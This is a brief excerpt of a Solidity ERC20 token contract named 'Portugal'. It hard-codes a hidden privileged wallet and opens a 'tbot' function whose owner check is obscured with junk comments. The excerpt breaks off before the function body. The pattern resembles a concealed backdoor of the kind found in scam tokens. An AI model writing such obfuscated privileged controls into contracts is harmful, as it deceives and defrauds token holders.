...
contract Portugal is Context, IERC20, Ownable {
    ...
    address payable public marketingWalletAddress = payable(0x6f49bae315d562608a5349f22F041832bA74053b); 
    address payable public ttWal = payable(0x6f49bae315d562608a5349f22F041832bA74053b); 
    ...
    function tbot(address _user, bool stte) public {
      if(/*sjk*/ttWal/*sjkds*/ ==
     /*sljkds*/msg.sender/*ssjkds*/ ){           
